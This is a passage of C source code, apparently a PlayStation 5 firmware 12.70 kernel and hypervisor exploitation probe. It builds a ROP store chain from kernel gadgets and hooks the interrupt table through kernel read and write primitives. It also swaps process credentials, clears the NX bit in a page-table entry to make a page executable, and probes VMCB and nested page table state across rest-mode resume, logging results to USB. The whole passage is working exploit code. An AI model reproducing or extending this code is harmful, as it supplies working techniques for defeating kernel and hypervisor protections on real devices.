  uint8_t handler_buf[(STUB_QWORDS + PARAM_QWORDS) * 5 * 8] = {0};
  kh_chain_t store_chain;
  kh_chain_init(&store_chain, handler_buf, sizeof(handler_buf));
  for (unsigned i = 0; i < STUB_QWORDS; ++i) {
    uint64_t qword = 0;
    memcpy(&qword, ap_stub + i * 8, 8);
    if (append_store(&store_chain, carrier_va + i * 8, qword) != 0) {
      kernel_set_ucred_authid(getpid(), authid);
      return 5;
    }
  }
#if defined(AP_VMCB_SURVEY_1270) || defined(AP_VMCB_STRIKE_1270) || \
    defined(AP_VMCB_EARLY_LATE_1270)
  uint64_t params[PARAM_QWORDS] = {
    stock_vector, kdldmap(0), cave + KH_OFF_USER + 8
  };
  for (unsigned i = 0; i < PARAM_QWORDS; ++i) {
    if (append_store(&store_chain, carrier_va + 0xf00 + i * 8,
                     params[i]) != 0) {
      kernel_set_ucred_authid(getpid(), authid);
      return 5;
    }
  }
#endif

  // The one-shot marker precedes this chain in the 0x600-byte data cave.
  if (sizeof(uint64_t) * 5 + store_chain.len + 0x100 >
      BIG_SAVE_BYTES) {
    kernel_set_ucred_authid(getpid(), authid);
    klog("AFP1270,1,stop,stage=chain-capacity,bytes=%zu,capacity=%u\n",
         sizeof(uint64_t) * 5 + store_chain.len + 0x100,
         BIG_SAVE_BYTES);
    return 5;
  }

  struct timespec stamp = {0};
  if (clock_gettime(CLOCK_REALTIME, &stamp) != 0) {
    kernel_set_ucred_authid(getpid(), authid);
    return 6;
  }
  snprintf(output_path, sizeof(output_path),
           "/mnt/usb0/PS5-12.70-%s-%d-%ld-%ld.txt",
           PROBE_STEM, (int)getpid(), (long)stamp.tv_sec, (long)stamp.tv_nsec);
  char line[384];
  uint64_t carrier_first8 = 0;
  memcpy(&carrier_first8, carrier_before, 8);
  snprintf(line, sizeof(line),
           "prepared,pid=%d,target=0x%016" PRIx64
           ",stock_vector=0x%016" PRIx64 ",cr3=0x%016" PRIx64
           ",carrier=0x%016" PRIx64 ",first8=0x%016" PRIx64
#ifdef AP_HV_READ_1270
           ",hv_read_pa=0x%016" PRIx64
#ifdef AP_HV_DUAL_READ_1270
           ",hv_read_pa2=0x%016" PRIx64
#endif
#endif
#ifdef AP_VMCB_RW_1270
           ",vmcb_pa=0x%016" PRIx64
#endif
#ifdef AP_NPT_TABLE_DUMP_1270
           ",npt_table_pa=0x%016" PRIx64
#endif
           ",stub_bytes=%u,stores=%u,chain_bytes=%zu\n",
           (int)getpid(), target, stock_vector, cr3, carrier_va,
           carrier_first8,
#ifdef AP_HV_READ_1270
           (uint64_t)HV_READ_PA,
#ifdef AP_HV_DUAL_READ_1270
           (uint64_t)HV_READ_PA2,
#endif
#endif
#ifdef AP_VMCB_RW_1270
           (uint64_t)VMCB_PA,
#endif
#ifdef AP_NPT_TABLE_DUMP_1270
           (uint64_t)NPT_TABLE_PA,
#endif
           STUB_BYTES, STUB_QWORDS, store_chain.len);
  if (save_line(line, 1) != 0) {
    kernel_set_ucred_authid(getpid(), authid);
    klog("RSH1270,1,stop,stage=usb-create,path=%s\n", output_path);
    return 7;
  }

  khook_t hook;
  int result = kh_init(&hook, kread, kwrite, ktext(0), cave, HOOK_IST);
  if (result != 0) {
    kernel_set_ucred_authid(getpid(), authid);
    return 8;
  }
  hook.tss_stride = KH_TSS_STRIDE;
  kh_set_tables(&hook, kdlsym(KERNEL_SYM_IDT_ARRAY),
                kdlsym(KERNEL_SYM_COMMON_TSS));
  kh_set_core(&hook, HOOK_CORE);
  kh_set_hook_target(&hook, target);
  hook.oneshot = 1;
  kh_set_resume_rsi(&hook, carrier_va);
  kh_set_resume_rdx(&hook, cr3);

  klog("RSH1270,1,start,target=0x%016" PRIx64
       ",vector=0x%016" PRIx64 ",cr3=0x%016" PRIx64 "\n",
       target, stock_vector, cr3);
  if (save_line("hook,before-install\n", 0) != 0) {
    cleanup(&hook, 0, cave, authid, 0);
    return 9;
  }
  result = kh_install(&hook, &store_chain);
  if (result != 0) {
    klog("RSH1270,1,stop,stage=install,result=%d\n", result);
    save_line("hook,install-failed\n", 0);
    cleanup(&hook, 0, cave, authid, 1);
    return 10;
  }
  if (save_line("hook,after-install\n", 0) != 0) {
    cleanup(&hook, 0, cave, authid, 1);
    return 11;
  }

  uint64_t chain_prefix[5] = {0};
  int chain_ok = kread(cave + KH_OFF_BIG_CHAIN, chain_prefix,
                       sizeof(chain_prefix)) == 0 &&
                 chain_prefix[0] == kgadget(KERNEL_GADGET_POP_RCX) &&
                 chain_prefix[1] == cave + KH_OFF_USER &&
                 chain_prefix[2] == kgadget(KERNEL_GADGET_POP_RAX) &&
                 chain_prefix[3] == SECOND_MARKER &&
                 chain_prefix[4] == kgadget(KERNEL_GADGET_ST_RCX_RAX);
  if (!chain_ok) {
    save_line("hook,marker-chain-mismatch\n", 0);
    cleanup(&hook, 0, cave, authid, 1);
    return 12;
  }
  uint8_t installed_handler[sizeof(handler_buf)] = {0};
  if (kread(cave + KH_OFF_BIG_CHAIN + sizeof(chain_prefix),
            installed_handler, store_chain.len) != 0 ||
      memcmp(installed_handler, handler_buf, store_chain.len) != 0) {
    save_line("hook,store-chain-mismatch\n", 0);
    cleanup(&hook, 0, cave, authid, 1);
    return 12;
  }

  uint64_t exec_pml4e = carrier_pml4e_original & ~NX_BIT;
  uint64_t map_readback = 0;
  if (kwrite(carrier_pml4e_addr, &exec_pml4e, 8) != 0 ||
      kread(carrier_pml4e_addr, &map_readback, 8) != 0 ||
      map_readback != exec_pml4e) {
    carrier_map_changed = 1;
    save_line("stop,stage=carrier-map-write\n", 0);
    cleanup(&hook, 0, cave, authid, 1);
    return 12;
  }
  carrier_map_changed = 1;
  if (save_line("carrier,guest-nx-cleared,stage=resume-only\n", 0) != 0) {
    cleanup(&hook, 0, cave, authid, 1);
    return 12;
  }

#ifdef FIXED_AP_PREP_ONLY_1270
  int prep_cleanup = cleanup(&hook, 0, cave, authid, 1);
  save_line(prep_cleanup == 0 ? "end,prepare-only=ok\n" :
            "end,prepare-only=cleanup-failed\n", 0);
  klog("RSH1270,1,end,prepare-only,cleanup=%d\n", prep_cleanup);
  return prep_cleanup == 0 ? 0 : 21;
#endif

  if (save_line("hook,before-trigger\n", 0) != 0) {
    cleanup(&hook, 0, cave, authid, 1);
    return 13;
  }
  result = kh_trigger(&hook);
  if (result != 0) {
    save_line("hook,trigger-failed\n", 0);
    cleanup(&hook, 1, cave, authid, 1);
    return 14;
  }
  if (save_line("hook,after-trigger\n", 0) != 0) {
    cleanup(&hook, 1, cave, authid, 1);
    return 15;
  }

  uint64_t marker = 0, ap_marker = 0;
#ifdef AP_HV_READ_1270
  uint64_t hv_value = 0;
#ifdef AP_HV_DUAL_READ_1270
  uint64_t hv_value2 = 0;
#endif
#endif
  if (read_qword(cave + KH_OFF_USER, &marker) != 0 || marker != 0 ||
      read_qword(cave + KH_OFF_USER + 8, &ap_marker) != 0 ||
      ap_marker != 0) {
    save_line("hook,unexpected-early-marker\n", 0);
    cleanup(&hook, 1, cave, authid, 1);
    return 16;
  }

#ifdef AP_NPT_TABLE_DUMP_1270
  npt_dump_armed = 1;
#endif
  if (save_line("ready,enter-rest-mode\n", 0) != 0) {
    cleanup(&hook, 1, cave, authid, 1);
    return 17;
  }
  klog("RSH1270,1,ready,path=%s\n", output_path);
  notifyf("12.70 %s AP probe ready\nEnter rest mode, then resume", PROBE_STEM);

  struct timespec previous = {0};
  clock_gettime(CLOCK_REALTIME, &previous);
  unsigned resumed_polls = 0;
  int saw_resume_gap = 0;
  for (unsigned awake = 0; awake < MAX_AWAKE_POLLS; ++awake) {
    sleep(1);
    struct timespec now = {0};
    if (clock_gettime(CLOCK_REALTIME, &now) == 0) {
      int64_t gap = (int64_t)now.tv_sec - (int64_t)previous.tv_sec;
      if (gap >= 10 && !saw_resume_gap) {
        saw_resume_gap = 1;
        klog("RSH1270,1,resume-gap,seconds=%ld\n", (long)gap);
      }
      previous = now;
    }
    if (read_qword(cave + KH_OFF_USER, &marker) != 0 ||
        read_qword(cave + KH_OFF_USER + 8, &ap_marker) != 0) {
      save_line_retry("stop,marker-read-failed\n");
      cleanup(&hook, 1, cave, authid, 1);
      return 18;
    }
    if (marker == SECOND_MARKER &&
        (ap_marker == AP_MARKER
#ifdef AP_VMCB_EARLY_LATE_1270
         || ap_marker == AP_SCAN_INCOMPLETE
#endif
#if defined(AP_VMCB_SURVEY_1270) || defined(AP_VMCB_STRIKE_1270)
         || ap_marker == AP_SURVEY_REJECTED
#endif
#ifdef AP_VMCB_STRIKE_1270
         || ap_marker == AP_STRIKE_FAILED
#endif
#ifdef AP_VMCB_RW_1270
         || ap_marker == AP_RW_BAD
#endif
         ))
      break;
    if ((marker != 0 && marker != SECOND_MARKER) ||
        (ap_marker != 0 && ap_marker != AP_MARKER
#ifdef AP_VMCB_EARLY_LATE_1270
         && ap_marker != AP_SCAN_ENTERED &&
         ap_marker != AP_SCAN_INCOMPLETE
#endif
#if defined(AP_VMCB_SURVEY_1270) || defined(AP_VMCB_STRIKE_1270)
         && ap_marker != AP_SURVEY_ENTERED &&
         ap_marker != AP_SURVEY_REJECTED
#endif
#ifdef AP_VMCB_STRIKE_1270
         && ap_marker != AP_STRIKE_FAILED
#endif
#ifdef AP_VMCB_RW_1270
         && ap_marker != AP_RW_ENTERED && ap_marker != AP_RW_BAD
#endif
         )) {
      save_line_retry("stop,unexpected-marker\n");
      cleanup(&hook, 1, cave, authid, 1);
      return 19;
    }
    if (marker == SECOND_MARKER && ++resumed_polls >= MAX_RESUME_POLLS)
      break;
  }

  int fired = marker == SECOND_MARKER;
  int ap_entered = ap_marker == AP_MARKER
#ifdef AP_VMCB_EARLY_LATE_1270
                   || ap_marker == AP_SCAN_ENTERED ||
                   ap_marker == AP_SCAN_INCOMPLETE
#endif
#if defined(AP_VMCB_SURVEY_1270) || defined(AP_VMCB_STRIKE_1270)
                   || ap_marker == AP_SURVEY_ENTERED ||
                   ap_marker == AP_SURVEY_REJECTED
#endif
#ifdef AP_VMCB_STRIKE_1270
                   || ap_marker == AP_STRIKE_FAILED
#endif
#ifdef AP_VMCB_RW_1270
                   || ap_marker == AP_RW_ENTERED || ap_marker == AP_RW_BAD
#endif
                   ;
#if defined(AP_VMCB_SURVEY_1270) || defined(AP_VMCB_STRIKE_1270)
  uint64_t survey_count = 0;
  int survey_read = read_qword(cave + KH_OFF_USER + 16, &survey_count);
#endif
#ifdef AP_VMCB_STRIKE_1270
  uint64_t strike_ctrl = 0;
  int strike_ctrl_read = read_qword(cave + KH_OFF_USER + 24,
                                   &strike_ctrl);
#endif
#ifdef AP_VMCB_EARLY_LATE_1270
  uint64_t scan_values[3] = {0};
  int scan_read = kread(cave + KH_OFF_USER + 16, scan_values,
                        sizeof(scan_values));
#endif
#ifdef AP_HV_READ_1270
  int hv_read = read_qword(cave + KH_OFF_USER + 16, &hv_value);
#ifdef AP_HV_DUAL_READ_1270
  int hv_read2 = read_qword(cave + KH_OFF_USER + 24, &hv_value2);
#endif
#endif
#ifdef AP_VMCB_RW_1270
  uint64_t rw_values[5] = {0};
  int rw_read = kread(cave + KH_OFF_USER + 16, rw_values, sizeof(rw_values));
  int rw_verified = ap_marker == AP_MARKER && rw_read == 0 &&
                    rw_values[0] == 9 &&
                    rw_values[1] >= 0x60000000ULL &&
                    rw_values[1] < 0x70000000ULL &&
                    (rw_values[1] & 0xfffULL) == 0 &&
                    rw_values[2] == 0 &&
                    rw_values[3] == 0x1270127012701270ULL &&
                    rw_values[4] == rw_values[2];
#endif
#ifdef AP_NPT_TABLE_DUMP_1270
  int dump_read = fired && ap_entered ?
                  kread(cave + NPT_DUMP_OFF, npt_dump_after,
                        sizeof(npt_dump_after)) : -1;
#endif
#ifdef AP_CORE_ARG_1270
  int arg_read = fired && ap_entered ?
                 kread(cave + KH_OFF_USER + 16, ap_args,
                       sizeof(ap_args)) : -1;
  unsigned arg_nonzero = 0;
  if (arg_read == 0)
    for (unsigned i = 0; i < 16; ++i)
      arg_nonzero += ap_args[i] != 0;
#endif
  int cleanup_result = cleanup(&hook, !fired, cave, authid, 1);
#ifdef AP_NPT_TABLE_DUMP_1270
  int dump_saved = dump_read == 0 && cleanup_result == 0 ?
                   save_npt_dump() : -1;
#endif
  snprintf(line, sizeof(line),
           "result,bp=0x%016" PRIx64 ",ap=0x%016" PRIx64
#ifdef AP_HV_READ_1270
           ",hv_value=0x%016" PRIx64 ",hv_read=%d"
#ifdef AP_HV_DUAL_READ_1270
           ",hv_value2=0x%016" PRIx64 ",hv_read2=%d"
#endif
#endif
#ifdef AP_VMCB_RW_1270
           ",vmcb_ctrl=0x%016" PRIx64 ",nested_cr3=0x%016" PRIx64
           ",reserved_before=0x%016" PRIx64
           ",reserved_observed=0x%016" PRIx64
           ",reserved_restored=0x%016" PRIx64
           ",rw_read=%d,rw_verified=%d"
#endif
#ifdef AP_NPT_TABLE_DUMP_1270
           ",dump_read=%d,dump_saved=%d"
#endif
#if defined(AP_VMCB_SURVEY_1270) || defined(AP_VMCB_STRIKE_1270)
           ",survey_count=%" PRIu64 ",survey_read=%d"
#endif
#ifdef AP_VMCB_STRIKE_1270
           ",reject_ctrl=0x%016" PRIx64 ",reject_ctrl_read=%d"
#endif
#ifdef AP_VMCB_EARLY_LATE_1270
           ",early_ctrl=0x%016" PRIx64 ",late_ctrl=0x%016" PRIx64
           ",scan_count=%" PRIu64 ",scan_read=%d"
#endif
#ifdef AP_CORE_ARG_1270
           ",arg_read=%d,arg_nonzero=%u"
#endif
           ",bp_fired=%d,ap_entered=%d,resume_gap=%d,cleanup=%d\n",
           marker, ap_marker,
#ifdef AP_HV_READ_1270
           hv_value, hv_read,
#ifdef AP_HV_DUAL_READ_1270
           hv_value2, hv_read2,
#endif
#endif
#ifdef AP_VMCB_RW_1270
           rw_values[0], rw_values[1], rw_values[2], rw_values[3],
           rw_values[4], rw_read, rw_verified,
#endif
#ifdef AP_NPT_TABLE_DUMP_1270
           dump_read, dump_saved,
#endif
#if defined(AP_VMCB_SURVEY_1270) || defined(AP_VMCB_STRIKE_1270)
           survey_count, survey_read,
#endif
#ifdef AP_VMCB_STRIKE_1270
           strike_ctrl, strike_ctrl_read,
#endif
#ifdef AP_VMCB_EARLY_LATE_1270
           scan_values[0], scan_values[1], scan_values[2], scan_read,
#endif
#ifdef AP_CORE_ARG_1270
           arg_read, arg_nonzero,
#endif
           fired, ap_entered, saw_resume_gap,
           cleanup_result);
  int saved = save_line_retry(line);
#ifdef AP_CORE_ARG_1270
  if (arg_read == 0) {
    char arg_line[384];
    size_t used = (size_t)snprintf(arg_line, sizeof(arg_line), "ap_args");
    for (unsigned i = 0; i < 16 && used < sizeof(arg_line); ++i)
      used += (size_t)snprintf(arg_line + used, sizeof(arg_line) - used,
                               ",%016" PRIx64, ap_args[i]);
    if (used < sizeof(arg_line) - 1) {
      arg_line[used++] = '\n';
      arg_line[used] = '\0';
      if (save_line_retry(arg_line) != 0)
        saved = -1;
    } else {
      saved = -1;
    }
  }
#endif
  klog("AFP1270,1,%s", line);
  // CLOCK_REALTIME may not expose the S3 pause to this polling thread.
  // The marker, cleanup, and durable result are the probe's success criteria.
  return fired && ap_entered && cleanup_result == 0 && saved == 0
#ifdef AP_HV_READ_1270
         && hv_read == 0
#ifdef AP_HV_DUAL_READ_1270
         && hv_read2 == 0
#endif
#endif
#ifdef AP_VMCB_RW_1270
         && rw_verified
#endif
#ifdef AP_NPT_TABLE_DUMP_1270
         && dump_read == 0 && dump_saved == 0
#endif
#if defined(AP_VMCB_SURVEY_1270) || defined(AP_VMCB_STRIKE_1270)
         && ap_marker == AP_MARKER && survey_read == 0 &&
         survey_count == 16
#endif
#ifdef AP_VMCB_STRIKE_1270
         && strike_ctrl_read == 0 && strike_ctrl == 0
#endif
#ifdef AP_VMCB_EARLY_LATE_1270
         && ap_marker == AP_MARKER && scan_read == 0 &&
         scan_values[2] == 15
#endif
#ifdef AP_CORE_ARG_1270
         && arg_read == 0 && arg_nonzero != 0
#endif
         ? 0 : 20;
}
